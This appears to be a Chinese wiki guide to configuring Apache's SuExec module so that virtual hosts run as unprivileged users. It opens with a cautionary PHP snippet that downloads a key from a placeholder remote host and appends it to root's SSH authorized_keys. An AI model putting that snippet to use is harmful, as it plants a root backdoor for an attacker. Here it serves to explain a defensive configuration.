这个文档描述了如何去使用Apache的SuExec模块去架设虚拟主机运行在普通用户权限下。通常情况下不让webspace拥有超级权限是一个良好的习惯，就像下面这段brutal PHP代码显示的那样:

```
   <?php
     # of course this link doesn't lead anywhere
     $rsa_key = file('http://yourhost.homeip.net/id_rsa.pub');
     exec("cat ${rsa_key[[0]]} >>/root/.ssh/authorized_keys");
   ?>

```

你同意这个观点吗? 为了预防这一点,绝对不要让你的虚拟主机拥有任何写入数据的权限除了在他自己的主目录下. 不幸地这个方法要求Apache作为超级用户才能运行，但这不是大问题，因为您在缺省DocumentRoot目录下不需要超级用户也可以运行.

如果你打算有几个FTP帐户分别指向几个需要写入权限的空间而且这些空间里的文件可以被Apache读取的话，你应该考虑使用SuExec.

## Contents

*   [1 必备知识](#.E5.BF.85.E5.A4.87.E7.9F.A5.E8.AF.86)
*   [2 在Apache里添加SuExec模块](#.E5.9C.A8Apache.E9.87.8C.E6.B7.BB.E5.8A.A0SuExec.E6.A8.A1.E5.9D.97)
*   [3 设置一个使用SuExec的虚拟主机](#.E8.AE.BE.E7.BD.AE.E4.B8.80.E4.B8.AA.E4.BD.BF.E7.94.A8SuExec.E7.9A.84.E8.99.9A.E6.8B.9F.E4.B8.BB.E6.9C.BA)
*   [4 "禁用"默认的DocumentRoot](#.22.E7.A6.81.E7.94.A8.22.E9.BB.98.E8.AE.A4.E7.9A.84DocumentRoot)
*   [5 结束](#.E7.BB.93.E6.9D.9F)
*   [6 相关链接](#.E7.9B.B8.E5.85.B3.E9.93.BE.E6.8E.A5)

#### 必备知识

*   你需要熟悉基本的Apache的配置，尤其是虚拟主机
*   目标主机的管理员权限
*   有关添加用户方面的知识
*   会使用pacman

#### 在Apache里添加SuExec模块

*   修改Apache配置文件`/etc/httpd/conf/httpd.conf`象这样

```
LoadModule suexec_module        lib/apache/mod_suexec.so

```

*   确认Apache的DocumentRoot目录没有 does not run as superuser either!

```
User http
Group http

```

#### 设置一个使用SuExec的虚拟主机

一种方法是直接在`/etc/httpd/conf/httpd.conf`中修改，但是我建议使用一个单独的配置文件，如果你打算配置超过两个以上的虚拟主机的话. 不管用那种方法，使用SuExec的虚拟主机应该象下面这样配置:

```
<VirtualHost 192.168.0.1:80>
        ServerName myhost
        ServerAlias  myhost.localdomain
        # this is where requests for / go
        DocumentRoot /home/www/vhosts/myhost.localdomain/htdocs

        # here you tell which user (myhost) and group (ftponly) Apache should use
        SuexecUserGroup myhost ftponly

        # the following are optional but might be of use for you
        ScriptAlias /cgi-bin/ /home/www/vhosts/myhost.localdomain/htdocs/cgi-bin
        php_admin_value open_basedir /home/www/vhosts/myhost.localdomain/htdocs
        php_admin_value upload_tmp_dir  /home/www/vhosts/myhost.localdomain/tmp
        # Safe mode will be removed as of PHP 6\. You may want to not enable it.
        php_admin_flag safe_mode On
        ErrorDocument 404 /home/www/vhosts/myhost.localdomain
        <Directory "/home/www/vhosts/myhost.localdomain/htdocs">
                AllowOverride None
                Order allow,deny
                Allow from all
                Options +SymlinksIfOwnerMatch +Includes
        </Directory>
</VirtualHost>

```

注意我们设置`upload_tmp_dir`为一个站点根目录以外的一个文件夹(不是 `/home/www/vhosts/myhost.localdomain/htdocs/tmp`). 它也应该是不能被其他系统用户读或写的.出于安全方面的原因：当PHP处理它时，这样不可能修改它或重写。

#### "禁用"默认的DocumentRoot

为了使你的站点更加安全牢固，避免Apache以超级用户身份运行，你可以禁用默认的`DocumentRoot`. 这个步骤并不是真正的“禁用”DocumentRoot, 与其指向别的地方还不如使用现在很容易修改的本机端口. 它可以通过替换您缺省的`ServerName`很容易地达到：

```
ServerName localhost:80

```

#### 结束

在改变任何系统默认的参数之后，[重启](/index.php/Daemons#Restarting "Daemons") **httpd** (Apache)才能生效。

#### 相关链接

*   关于SuExec的更多内容请浏览: [http://httpd.apache.org/docs/suexec.html](http://httpd.apache.org/docs/suexec.html)
*   有关VirtualHosts的更多内容请浏览: [http://httpd.apache.org/docs/vhosts/index.html](http://httpd.apache.org/docs/vhosts/index.html)